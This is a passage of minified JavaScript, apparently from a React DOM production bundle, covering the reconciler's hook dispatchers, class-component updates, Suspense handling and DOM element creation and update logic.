o=n.lastRenderedState,s=l(o,t);if(i.hasEagerState=!0,i.eagerState=s,Me(s,o)){var a=n.interleaved;a===null?(i.next=i,Lo(n)):(i.next=a.next,a.next=i),n.interleaved=i;return}}catch{}finally{}t=Bu(e,n,i,r),t!==null&&(i=ae(),Ae(t,e,r,i),oc(t,n,r))}}function ic(e){var n=e.alternate;return e===H||n!==null&&n===H}function lc(e,n){It=si=!0;var t=e.pending;t===null?n.next=n:(n.next=t.next,t.next=n),e.pending=n}function oc(e,n,t){if(t&4194240){var r=n.lanes;r&=e.pendingLanes,t|=r,n.lanes=t,go(e,t)}}var ai={readContext:_e,useCallback:re,useContext:re,useEffect:re,useImperativeHandle:re,useInsertionEffect:re,useLayoutEffect:re,useMemo:re,useReducer:re,useRef:re,useState:re,useDebugValue:re,useDeferredValue:re,useTransition:re,useMutableSource:re,useSyncExternalStore:re,useId:re,unstable_isNewReconciler:!1},ep={readContext:_e,useCallback:function(e,n){return De().memoizedState=[e,n===void 0?null:n],e},useContext:_e,useEffect:Ws,useImperativeHandle:function(e,n,t){return t=t!=null?t.concat([e]):null,Br(4194308,4,Ju.bind(null,n,e),t)},useLayoutEffect:function(e,n){return Br(4194308,4,e,n)},useInsertionEffect:function(e,n){return Br(4,2,e,n)},useMemo:function(e,n){var t=De();return n=n===void 0?null:n,e=e(),t.memoizedState=[e,n],e},useReducer:function(e,n,t){var r=De();return n=t!==void 0?t(n):n,r.memoizedState=r.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},r.queue=e,e=e.dispatch=Jf.bind(null,H,e),[r.memoizedState,e]},useRef:function(e){var n=De();return e={current:e},n.memoizedState=e},useState:Vs,useDebugValue:Bo,useDeferredValue:function(e){return De().memoizedState=e},useTransition:function(){var e=Vs(!1),n=e[0];return e=qf.bind(null,e[1]),De().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,t){var r=H,i=De();if(B){if(t===void 0)throw Error(S(407));t=t()}else{if(t=n(),Z===null)throw Error(S(349));In&30||Wu(r,n,t)}i.memoizedState=t;var l={value:t,getSnapshot:n};return i.queue=l,Ws(Gu.bind(null,r,l,e),[e]),r.flags|=2048,nr(9,$u.bind(null,r,l,t,n),void 0,null),t},useId:function(){var e=De(),n=Z.identifierPrefix;if(B){var t=$e,r=We;t=(r&~(1<<32-Re(r)-1)).toString(32)+t,n=":"+n+"R"+t,t=Zt++,0<t&&(n+="H"+t.toString(32)),n+=":"}else t=Xf++,n=":"+n+"r"+t.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},np={readContext:_e,useCallback:ec,useContext:_e,useEffect:zo,useImperativeHandle:Zu,useInsertionEffect:Xu,useLayoutEffect:qu,useMemo:nc,useReducer:nl,useRef:Yu,useState:function(){return nl(er)},useDebugValue:Bo,useDeferredValue:function(e){var n=Pe();return tc(n,Y.memoizedState,e)},useTransition:function(){var e=nl(er)[0],n=Pe().memoizedState;return[e,n]},useMutableSource:Hu,useSyncExternalStore:Vu,useId:rc,unstable_isNewReconciler:!1},tp={readContext:_e,useCallback:ec,useContext:_e,useEffect:zo,useImperativeHandle:Zu,useInsertionEffect:Xu,useLayoutEffect:qu,useMemo:nc,useReducer:tl,useRef:Yu,useState:function(){return tl(er)},useDebugValue:Bo,useDeferredValue:function(e){var n=Pe();return Y===null?n.memoizedState=e:tc(n,Y.memoizedState,e)},useTransition:function(){var e=tl(er)[0],n=Pe().memoizedState;return[e,n]},useMutableSource:Hu,useSyncExternalStore:Vu,useId:rc,unstable_isNewReconciler:!1};function Le(e,n){if(e&&e.defaultProps){n=V({},n),e=e.defaultProps;for(var t in e)n[t]===void 0&&(n[t]=e[t]);return n}return n}function zl(e,n,t,r){n=e.memoizedState,t=t(r,n),t=t==null?n:V({},n,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var bi={isMounted:function(e){return(e=e._reactInternals)?Un(e)===e:!1},enqueueSetState:function(e,n,t){e=e._reactInternals;var r=ae(),i=hn(e),l=Ge(r,i);l.payload=n,t!=null&&(l.callback=t),n=fn(e,l,i),n!==null&&(Ae(n,e,i,r),Dr(n,e,i))},enqueueReplaceState:function(e,n,t){e=e._reactInternals;var r=ae(),i=hn(e),l=Ge(r,i);l.tag=1,l.payload=n,t!=null&&(l.callback=t),n=fn(e,l,i),n!==null&&(Ae(n,e,i,r),Dr(n,e,i))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var t=ae(),r=hn(e),i=Ge(t,r);i.tag=2,n!=null&&(i.callback=n),n=fn(e,i,r),n!==null&&(Ae(n,e,r,t),Dr(n,e,r))}};function $s(e,n,t,r,i,l,o){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(r,l,o):n.prototype&&n.prototype.isPureReactComponent?!Qt(t,r)||!Qt(i,l):!0}function sc(e,n,t){var r=!1,i=yn,l=n.contextType;return typeof l=="object"&&l!==null?l=_e(l):(i=he(n)?An:oe.current,r=n.contextTypes,l=(r=r!=null)?at(e,i):yn),n=new n(t,l),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=bi,e.stateNode=n,n._reactInternals=e,r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=i,e.__reactInternalMemoizedMaskedChildContext=l),n}function Gs(e,n,t,r){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(t,r),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(t,r),n.state!==e&&bi.enqueueReplaceState(n,n.state,null)}function Bl(e,n,t,r){var i=e.stateNode;i.props=t,i.state=e.memoizedState,i.refs={},jo(e);var l=n.contextType;typeof l=="object"&&l!==null?i.context=_e(l):(l=he(n)?An:oe.current,i.context=at(e,l)),i.state=e.memoizedState,l=n.getDerivedStateFromProps,typeof l=="function"&&(zl(e,n,l,t),i.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(n=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),n!==i.state&&bi.enqueueReplaceState(i,i.state,null),li(e,t,i,r),i.state=e.memoizedState),typeof i.componentDidMount=="function"&&(e.flags|=4194308)}function ft(e,n){try{var t="",r=n;do t+=Nd(r),r=r.return;while(r);var i=t}catch(l){i=`
Error generating stack: `+l.message+`
`+l.stack}return{value:e,source:n,stack:i,digest:null}}function rl(e,n,t){return{value:e,source:null,stack:t??null,digest:n??null}}function Ul(e,n){try{console.error(n.value)}catch(t){setTimeout(function(){throw t})}}var rp=typeof WeakMap=="function"?WeakMap:Map;function ac(e,n,t){t=Ge(-1,t),t.tag=3,t.payload={element:null};var r=n.value;return t.callback=function(){ci||(ci=!0,Xl=r),Ul(e,n)},t}function uc(e,n,t){t=Ge(-1,t),t.tag=3;var r=e.type.getDerivedStateFromError;if(typeof r=="function"){var i=n.value;t.payload=function(){return r(i)},t.callback=function(){Ul(e,n)}}var l=e.stateNode;return l!==null&&typeof l.componentDidCatch=="function"&&(t.callback=function(){Ul(e,n),typeof r!="function"&&(pn===null?pn=new Set([this]):pn.add(this));var o=n.stack;this.componentDidCatch(n.value,{componentStack:o!==null?o:""})}),t}function Qs(e,n,t){var r=e.pingCache;if(r===null){r=e.pingCache=new rp;var i=new Set;r.set(n,i)}else i=r.get(n),i===void 0&&(i=new Set,r.set(n,i));i.has(t)||(i.add(t),e=vp.bind(null,e,n,t),n.then(e,e))}function Ks(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function Ys(e,n,t,r,i){return e.mode&1?(e.flags|=65536,e.lanes=i,e):(e===n?e.flags|=65536:(e.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(n=Ge(-1,1),n.tag=2,fn(t,n,1))),t.lanes|=1),e)}var ip=Je.ReactCurrentOwner,fe=!1;function se(e,n,t,r){n.child=e===null?zu(n,null,t,r):ct(n,e.child,t,r)}function Xs(e,n,t,r,i){t=t.render;var l=n.ref;return lt(n,i),r=Io(e,n,t,r,l,i),t=Do(),e!==null&&!fe?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~i,qe(e,n,i)):(B&&t&&Eo(n),n.flags|=1,se(e,n,r,i),n.child)}function qs(e,n,t,r,i){if(e===null){var l=t.type;return typeof l=="function"&&!Qo(l)&&l.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(n.tag=15,n.type=l,cc(e,n,l,r,i)):(e=Vr(t.type,null,r,n,n.mode,i),e.ref=n.ref,e.return=n,n.child=e)}if(l=e.child,!(e.lanes&i)){var o=l.memoizedProps;if(t=t.compare,t=t!==null?t:Qt,t(o,r)&&e.ref===n.ref)return qe(e,n,i)}return n.flags|=1,e=mn(l,r),e.ref=n.ref,e.return=n,n.child=e}function cc(e,n,t,r,i){if(e!==null){var l=e.memoizedProps;if(Qt(l,r)&&e.ref===n.ref)if(fe=!1,n.pendingProps=r=l,(e.lanes&i)!==0)e.flags&131072&&(fe=!0);else return n.lanes=e.lanes,qe(e,n,i)}return Fl(e,n,t,r,i)}function dc(e,n,t){var r=n.pendingProps,i=r.children,l=e!==null?e.memoizedState:null;if(r.mode==="hidden")if(!(n.mode&1))n.memoizedState={baseLanes:0,cachePool:null,transitions:null},I(et,ve),ve|=t;else{if(!(t&1073741824))return e=l!==null?l.baseLanes|t:t,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,I(et,ve),ve|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=l!==null?l.baseLanes:t,I(et,ve),ve|=r}else l!==null?(r=l.baseLanes|t,n.memoizedState=null):r=t,I(et,ve),ve|=r;return se(e,n,i,t),n.child}function fc(e,n){var t=n.ref;(e===null&&t!==null||e!==null&&e.ref!==t)&&(n.flags|=512,n.flags|=2097152)}function Fl(e,n,t,r,i){var l=he(t)?An:oe.current;return l=at(n,l),lt(n,i),t=Io(e,n,t,r,l,i),r=Do(),e!==null&&!fe?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~i,qe(e,n,i)):(B&&r&&Eo(n),n.flags|=1,se(e,n,t,i),n.child)}function Js(e,n,t,r,i){if(he(t)){var l=!0;ei(n)}else l=!1;if(lt(n,i),n.stateNode===null)Ur(e,n),sc(n,t,r),Bl(n,t,r,i),r=!0;else if(e===null){var o=n.stateNode,s=n.memoizedProps;o.props=s;var a=o.context,d=t.contextType;typeof d=="object"&&d!==null?d=_e(d):(d=he(t)?An:oe.current,d=at(n,d));var m=t.getDerivedStateFromProps,h=typeof m=="function"||typeof o.getSnapshotBeforeUpdate=="function";h||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(s!==r||a!==d)&&Gs(n,o,r,d),nn=!1;var g=n.memoizedState;o.state=g,li(n,r,o,i),a=n.memoizedState,s!==r||g!==a||pe.current||nn?(typeof m=="function"&&(zl(n,t,m,r),a=n.memoizedState),(s=nn||$s(n,t,s,r,g,a,d))?(h||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount()),typeof o.componentDidMount=="function"&&(n.flags|=4194308)):(typeof o.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=r,n.memoizedState=a),o.props=r,o.state=a,o.context=d,r=s):(typeof o.componentDidMount=="function"&&(n.flags|=4194308),r=!1)}else{o=n.stateNode,Uu(e,n),s=n.memoizedProps,d=n.type===n.elementType?s:Le(n.type,s),o.props=d,h=n.pendingProps,g=o.context,a=t.contextType,typeof a=="object"&&a!==null?a=_e(a):(a=he(t)?An:oe.current,a=at(n,a));var k=t.getDerivedStateFromProps;(m=typeof k=="function"||typeof o.getSnapshotBeforeUpdate=="function")||typeof o.UNSAFE_componentWillReceiveProps!="function"&&typeof o.componentWillReceiveProps!="function"||(s!==h||g!==a)&&Gs(n,o,r,a),nn=!1,g=n.memoizedState,o.state=g,li(n,r,o,i);var w=n.memoizedState;s!==h||g!==w||pe.current||nn?(typeof k=="function"&&(zl(n,t,k,r),w=n.memoizedState),(d=nn||$s(n,t,d,r,g,w,a)||!1)?(m||typeof o.UNSAFE_componentWillUpdate!="function"&&typeof o.componentWillUpdate!="function"||(typeof o.componentWillUpdate=="function"&&o.componentWillUpdate(r,w,a),typeof o.UNSAFE_componentWillUpdate=="function"&&o.UNSAFE_componentWillUpdate(r,w,a)),typeof o.componentDidUpdate=="function"&&(n.flags|=4),typeof o.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof o.componentDidUpdate!="function"||s===e.memoizedProps&&g===e.memoizedState||(n.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||s===e.memoizedProps&&g===e.memoizedState||(n.flags|=1024),n.memoizedProps=r,n.memoizedState=w),o.props=r,o.state=w,o.context=a,r=d):(typeof o.componentDidUpdate!="function"||s===e.memoizedProps&&g===e.memoizedState||(n.flags|=4),typeof o.getSnapshotBeforeUpdate!="function"||s===e.memoizedProps&&g===e.memoizedState||(n.flags|=1024),r=!1)}return Hl(e,n,t,r,l,i)}function Hl(e,n,t,r,i,l){fc(e,n);var o=(n.flags&128)!==0;if(!r&&!o)return i&&Ds(n,t,!1),qe(e,n,l);r=n.stateNode,ip.current=n;var s=o&&typeof t.getDerivedStateFromError!="function"?null:r.render();return n.flags|=1,e!==null&&o?(n.child=ct(n,e.child,null,l),n.child=ct(n,null,s,l)):se(e,n,s,l),n.memoizedState=r.state,i&&Ds(n,t,!0),n.child}function pc(e){var n=e.stateNode;n.pendingContext?Is(e,n.pendingContext,n.pendingContext!==n.context):n.context&&Is(e,n.context,!1),Oo(e,n.containerInfo)}function Zs(e,n,t,r,i){return ut(),To(i),n.flags|=256,se(e,n,t,r),n.child}var Vl={dehydrated:null,treeContext:null,retryLane:0};function Wl(e){return{baseLanes:e,cachePool:null,transitions:null}}function hc(e,n,t){var r=n.pendingProps,i=F.current,l=!1,o=(n.flags&128)!==0,s;if((s=o)||(s=e!==null&&e.memoizedState===null?!1:(i&2)!==0),s?(l=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(i|=1),I(F,i&1),e===null)return Il(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(n.mode&1?e.data==="$!"?n.lanes=8:n.lanes=1073741824:n.lanes=1,null):(o=r.children,e=r.fallback,l?(r=n.mode,l=n.child,o={mode:"hidden",children:o},!(r&1)&&l!==null?(l.childLanes=0,l.pendingProps=o):l=Ti(o,r,0,null),e=Rn(e,r,t,null),l.return=n,e.return=n,l.sibling=e,n.child=l,n.child.memoizedState=Wl(t),n.memoizedState=Vl,e):Uo(n,o));if(i=e.memoizedState,i!==null&&(s=i.dehydrated,s!==null))return lp(e,n,o,r,s,i,t);if(l){l=r.fallback,o=n.mode,i=e.child,s=i.sibling;var a={mode:"hidden",children:r.children};return!(o&1)&&n.child!==i?(r=n.child,r.childLanes=0,r.pendingProps=a,n.deletions=null):(r=mn(i,a),r.subtreeFlags=i.subtreeFlags&14680064),s!==null?l=mn(s,l):(l=Rn(l,o,t,null),l.flags|=2),l.return=n,r.return=n,r.sibling=l,n.child=r,r=l,l=n.child,o=e.child.memoizedState,o=o===null?Wl(t):{baseLanes:o.baseLanes|t,cachePool:null,transitions:o.transitions},l.memoizedState=o,l.childLanes=e.childLanes&~t,n.memoizedState=Vl,r}return l=e.child,e=l.sibling,r=mn(l,{mode:"visible",children:r.children}),!(n.mode&1)&&(r.lanes=t),r.return=n,r.sibling=null,e!==null&&(t=n.deletions,t===null?(n.deletions=[e],n.flags|=16):t.push(e)),n.child=r,n.memoizedState=null,r}function Uo(e,n){return n=Ti({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function Pr(e,n,t,r){return r!==null&&To(r),ct(n,e.child,null,t),e=Uo(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function lp(e,n,t,r,i,l,o){if(t)return n.flags&256?(n.flags&=-257,r=rl(Error(S(422))),Pr(e,n,o,r)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(l=r.fallback,i=n.mode,r=Ti({mode:"visible",children:r.children},i,0,null),l=Rn(l,i,o,null),l.flags|=2,r.return=n,l.return=n,r.sibling=l,n.child=r,n.mode&1&&ct(n,e.child,null,o),n.child.memoizedState=Wl(o),n.memoizedState=Vl,l);if(!(n.mode&1))return Pr(e,n,o,null);if(i.data==="$!"){if(r=i.nextSibling&&i.nextSibling.dataset,r)var s=r.dgst;return r=s,l=Error(S(419)),r=rl(l,r,void 0),Pr(e,n,o,r)}if(s=(o&e.childLanes)!==0,fe||s){if(r=Z,r!==null){switch(o&-o){case 4:i=2;break;case 16:i=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:i=32;break;case 536870912:i=268435456;break;default:i=0}i=i&(r.suspendedLanes|o)?0:i,i!==0&&i!==l.retryLane&&(l.retryLane=i,Xe(e,i),Ae(r,e,i,-1))}return Go(),r=rl(Error(S(421))),Pr(e,n,o,r)}return i.data==="$?"?(n.flags|=128,n.child=e.child,n=yp.bind(null,e),i._reactRetry=n,null):(e=l.treeContext,ye=dn(i.nextSibling),we=n,B=!0,Oe=null,e!==null&&(be[Ee++]=We,be[Ee++]=$e,be[Ee++]=Mn,We=e.id,$e=e.overflow,Mn=n),n=Uo(n,r.children),n.flags|=4096,n)}function ea(e,n,t){e.lanes|=n;var r=e.alternate;r!==null&&(r.lanes|=n),Dl(e.return,n,t)}function il(e,n,t,r,i){var l=e.memoizedState;l===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:r,tail:t,tailMode:i}:(l.isBackwards=n,l.rendering=null,l.renderingStartTime=0,l.last=r,l.tail=t,l.tailMode=i)}function mc(e,n,t){var r=n.pendingProps,i=r.revealOrder,l=r.tail;if(se(e,n,r.children,t),r=F.current,r&2)r=r&1|2,n.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&ea(e,t,n);else if(e.tag===19)ea(e,t,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}r&=1}if(I(F,r),!(n.mode&1))n.memoizedState=null;else switch(i){case"forwards":for(t=n.child,i=null;t!==null;)e=t.alternate,e!==null&&oi(e)===null&&(i=t),t=t.sibling;t=i,t===null?(i=n.child,n.child=null):(i=t.sibling,t.sibling=null),il(n,!1,i,t,l);break;case"backwards":for(t=null,i=n.child,n.child=null;i!==null;){if(e=i.alternate,e!==null&&oi(e)===null){n.child=i;break}e=i.sibling,i.sibling=t,t=i,i=e}il(n,!0,t,null,l);break;case"together":il(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function Ur(e,n){!(n.mode&1)&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function qe(e,n,t){if(e!==null&&(n.dependencies=e.dependencies),Dn|=n.lanes,!(t&n.childLanes))return null;if(e!==null&&n.child!==e.child)throw Error(S(153));if(n.child!==null){for(e=n.child,t=mn(e,e.pendingProps),n.child=t,t.return=n;e.sibling!==null;)e=e.sibling,t=t.sibling=mn(e,e.pendingProps),t.return=n;t.sibling=null}return n.child}function op(e,n,t){switch(n.tag){case 3:pc(n),ut();break;case 5:Fu(n);break;case 1:he(n.type)&&ei(n);break;case 4:Oo(n,n.stateNode.containerInfo);break;case 10:var r=n.type._context,i=n.memoizedProps.value;I(ri,r._currentValue),r._currentValue=i;break;case 13:if(r=n.memoizedState,r!==null)return r.dehydrated!==null?(I(F,F.current&1),n.flags|=128,null):t&n.child.childLanes?hc(e,n,t):(I(F,F.current&1),e=qe(e,n,t),e!==null?e.sibling:null);I(F,F.current&1);break;case 19:if(r=(t&n.childLanes)!==0,e.flags&128){if(r)return mc(e,n,t);n.flags|=128}if(i=n.memoizedState,i!==null&&(i.rendering=null,i.tail=null,i.lastEffect=null),I(F,F.current),r)break;return null;case 22:case 23:return n.lanes=0,dc(e,n,t)}return qe(e,n,t)}var gc,$l,vc,yc;gc=function(e,n){for(var t=n.child;t!==null;){if(t.tag===5||t.tag===6)e.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break;for(;t.sibling===null;){if(t.return===null||t.return===n)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};$l=function(){};vc=function(e,n,t,r){var i=e.memoizedProps;if(i!==r){e=n.stateNode,jn(Ue.current);var l=null;switch(t){case"input":i=pl(e,i),r=pl(e,r),l=[];break;case"select":i=V({},i,{value:void 0}),r=V({},r,{value:void 0}),l=[];break;case"textarea":i=gl(e,i),r=gl(e,r),l=[];break;default:typeof i.onClick!="function"&&typeof r.onClick=="function"&&(e.onclick=Jr)}yl(t,r);var o;t=null;for(d in i)if(!r.hasOwnProperty(d)&&i.hasOwnProperty(d)&&i[d]!=null)if(d==="style"){var s=i[d];for(o in s)s.hasOwnProperty(o)&&(t||(t={}),t[o]="")}else d!=="dangerouslySetInnerHTML"&&d!=="children"&&d!=="suppressContentEditableWarning"&&d!=="suppressHydrationWarning"&&d!=="autoFocus"&&(Ut.hasOwnProperty(d)?l||(l=[]):(l=l||[]).push(d,null));for(d in r){var a=r[d];if(s=i!=null?i[d]:void 0,r.hasOwnProperty(d)&&a!==s&&(a!=null||s!=null))if(d==="style")if(s){for(o in s)!s.hasOwnProperty(o)||a&&a.hasOwnProperty(o)||(t||(t={}),t[o]="");for(o in a)a.hasOwnProperty(o)&&s[o]!==a[o]&&(t||(t={}),t[o]=a[o])}else t||(l||(l=[]),l.push(d,t)),t=a;else d==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,s=s?s.__html:void 0,a!=null&&s!==a&&(l=l||[]).push(d,a)):d==="children"?typeof a!="string"&&typeof a!="number"||(l=l||[]).push(d,""+a):d!=="suppressContentEditableWarning"&&d!=="suppressHydrationWarning"&&(Ut.hasOwnProperty(d)?(a!=null&&d==="onScroll"&&D("scroll",e),l||s===a||(l=[])):(l=l||[]).push(d,a))}t&&(l=l||[]).push("style",t);var d=l;(n.updateQueue=d)&&(n.flags|=4)}};yc=function(e,n,t,r){t!==r&&(n.flags|=4)};function Ct(e,n){if(!B)switch(e.tailMode){case"hidden":n=e.tail;for(var t=null;n!==null;)n.alternate!==null&&(t=n),n=n.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var r=null;t!==null;)t.alternate!==null&&(r=t),t=t.sibling;r===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:r.sibling=null}}function ie(e){var n=e.alternate!==null&&e.alternate.child===e.child,t=0,r=0;if(n)for(var i=e.child;i!==null;)t|=i.lanes|i.childLanes,r|=i.subtreeFlags&14680064,r|=i.flags&14680064,i.return=e,i=i.sibling;else for(i=e.child;i!==null;)t|=i.lanes|i.childLanes,r|=i.subtreeFlags,r|=i.flags,i.return=e,i=i.sibling;return e.subtreeFlags|=r,e.childLanes=t,n}function sp(e,n,t){var r=n.pendingProps;switch(Co(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return ie(n),null;case 1:return he(n.type)&&Zr(),ie(n),null;case 3:return r=n.stateNode,dt(),z(pe),z(oe),Ao(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(e===null||e.child===null)&&(Tr(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&!(n.flags&256)||(n.flags|=1024,Oe!==null&&(Zl(Oe),Oe=null))),$l(e,n),ie(n),null;case 5:Ro(n);var i=jn(Jt.current);if(t=n.type,e!==null&&n.stateNode!=null)vc(e,n,t,r,i),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!r){if(n.stateNode===null)throw Error(S(166));return ie(n),null}if(e=jn(Ue.current),Tr(n)){r=n.stateNode,t=n.type;var l=n.memoizedProps;switch(r[ze]=n,r[Xt]=l,e=(n.mode&1)!==0,t){case"dialog":D("cancel",r),D("close",r);break;case"iframe":case"object":case"embed":D("load",r);break;case"video":case"audio":for(i=0;i<Lt.length;i++)D(Lt[i],r);break;case"source":D("error",r);break;case"img":case"image":case"link":D("error",r),D("load",r);break;case"details":D("toggle",r);break;case"input":us(r,l),D("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!l.multiple},D("invalid",r);break;case"textarea":ds(r,l),D("invalid",r)}yl(t,l),i=null;for(var o in l)if(l.hasOwnProperty(o)){var s=l[o];o==="children"?typeof s=="string"?r.textContent!==s&&(l.suppressHydrationWarning!==!0&&Cr(r.textContent,s,e),i=["children",s]):typeof s=="number"&&r.textContent!==""+s&&(l.suppressHydrationWarning!==!0&&Cr(r.textContent,s,e),i=["children",""+s]):Ut.hasOwnProperty(o)&&s!=null&&o==="onScroll"&&D("scroll",r)}switch(t){case"input":vr(r),cs(r,l,!0);break;case"textarea":vr(r),fs(r);break;case"select":case"option":break;default:typeof l.onClick=="function"&&(r.onclick=Jr)}r=i,n.updateQueue=r,r!==null&&(n.flags|=4)}else{o=i.nodeType===9?i:i.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Ga(t)),e==="http://www.w3.org/1999/xhtml"?t==="script"?(e=o.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof r.is=="string"?e=o.createElement(t,{is:r.is}):(e=o.createElement(t),t==="select"&&(o=e,r.multiple?o.multiple=!0:r.size&&(o.size=r.size))):e=o.createElementNS(e,t),e[ze]=n,e[Xt]=r,gc(e,n,!1,!1),n.stateNode=e;e:{switch(o=wl(t,r),t){case"dialog":D("cancel",e),D("close",e),i=r;break;case"iframe":case"object":case"embed":D("load",e),i=r;break;case"video":case"audio":for(i=0;i<Lt.length;i++)D(Lt[i],e);i=r;break;case"source":D("error",e),i=r;break;case"img":case"image":case"link":D("error",e),D("load",e),i=r;break;case"details":D("toggle",e),i=r;break;case"input":us(e,r),i=pl(e,r),D("invalid",e);break;case"option":i=r;break;case"select":e._wrapperState={wasMultiple:!!r.multiple},i=V({},r,{value:void 0}),D("invalid",e);break;case"textarea":ds(e,r),i=gl(e,r),D("invalid",e);break;default:i=r}yl(t,i),s=i;for(l in s)if(s.hasOwnProperty(l)){var a=s[l];l==="style"?Ya(e,a):l==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,a!=null&&Qa(e,a)):l==="children"?typeof a=="string"?(t!=="textarea"||a!=="")&&Ft(e,a):typeof a=="number"&&Ft(e,""+a):l!=="suppressContentEditableWarning"&&l!=="suppressHydrationWarning"&&l!=="autoFocus"&&(Ut.hasOwnProperty(l)?a!=null&&l==="onScroll"&&D("scroll",e):a!=null&&uo(e,l,a,o))}switch(t){case"input":vr(e),cs(e,r,!1);break;case"textarea":vr(e),fs(e);break;case"option":r.value!=null&&e.setAttribute("value",""+vn(r.value));break;case"select":e.multiple=!!r.multiple,l=r.value,l!=null?nt(e,!!r.multiple,l,!1):r.defaultValue!=null&&nt(e,!!r.multiple,r.defaultValue,!0);break;default:typeof i.onClick=="function"&&(e.onclick=Jr)}switch(t){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return ie(n),null;case 6:if(e&&n.stateNode!=null)yc(e,n,e.memoizedProps,r);else{if(typeof r!="string"&&n.stateNode===null)throw Error(S(166));if(t=jn(Jt.current),jn(Ue.current),Tr(n)){if(r=n.stateNode,t=n.memoizedProps,r[ze]=n,(l=r.nodeValue!==t)&&(e=we,e!==null))switch(e.tag){case 3:Cr(r.nodeValue,t,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&Cr(r.nodeValue,t,(e.mode&1)!==0)}l&&(n.flags|=4)}else r=(t.nodeType===9?t:t.ownerDocument).createTextNode(r),r[ze]=n,n.stateNode=r}return ie(n),null;case 13:if(z(F),r=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(B&&ye!==null&&n.mode&1&&!(n.flags&128))Iu(),ut(),n.flags|=98560,l=!1;else if(l=Tr(n),r!==null&&r.dehydrated!==null){if(e===null){if(!l)throw Error(S(318));if(l=n.memoizedState,l=l!==null?l.dehydrated:null,!l)throw Error(S(317));l[ze]=n}else ut(),!(n.flags&128)&&(n.memoizedState=null),n.flags|=4;ie(n),l=!1}else Oe!==null&&(Zl(Oe),Oe=null),l=!0;if(!l)return n.flags&65536?n:null}return n.flags&128?(n.lanes=t,n):(r=r!==null,r!==(e!==null&&e.memoizedState!==null)&&r&&(n.child.flags|=8192,n.mode&1&&(e===null||F.current&1?X===0&&(X=3):Go())),n.updateQueue!==null&&(n.flags|=4),ie(n),null);case 4:return dt(),$l(e,n),e===null&&Kt(n.stateNode.containerInfo),ie(n),null;case 10:return No(n.type._context),ie(n),null;case 17:return he(n.type)&&Zr(),ie(n),null;case 19:if(z(F),l=n.memoizedState,l===null)return 